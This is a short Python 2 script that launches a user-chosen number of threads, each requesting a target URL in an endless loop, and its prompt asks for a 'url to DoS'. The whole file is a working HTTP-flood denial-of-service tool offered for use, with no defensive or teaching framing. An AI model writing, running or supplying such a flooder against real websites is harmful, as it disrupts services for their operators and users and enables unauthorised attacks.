import urllib
import threading
 
CANCEL = "-1.60*10^19"
COMMAND = "RUN THREADED APPLICATION"
LOCK = threading.Lock()
 
class Spammer(threading.Thread):
    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
 
    def run(self):
        global COMMAND
        global CANCEL
        global LOCK
        LOCK.acquire()
        print("Starting thread #{0}".format(self.num))
        LOCK.release()
        while COMMAND != CANCEL:
            try: 
                urllib.urlopen(self.url)
            except Exception: 
                pass
        LOCK.acquire()
        print("Exiting thread #{0}".format(self.num))
        LOCK.release()
 
if __name__ == "__main__":
    while 1:
        try:
            num_threads = int(raw_input("Enter number of threads: "))
        except ValueError:
            print("Input cannot be converted to an integer.")
        else:
            break
    while 1:
        url = raw_input("Enter url to DoS (enter nothing to exit): ")
        if url == "":
            exit(1)
        try:
            urllib.urlopen(url)
        except IOError:
            print("Could not open url specified.")
        else:
            break
    for i in range(num_threads):
        Spammer(url, i+1).start()
    if raw_input("This prompt does not affect the execution of your program.\n"
                 "At any point, you can enter the word 'quit' into this "
                 "prompt and the program will exit. Do not press enter or "
                 "use this prompt until you are ready to quit.\n"
                 "--> ").lower() == "quit":
        COMMAND = CANCEL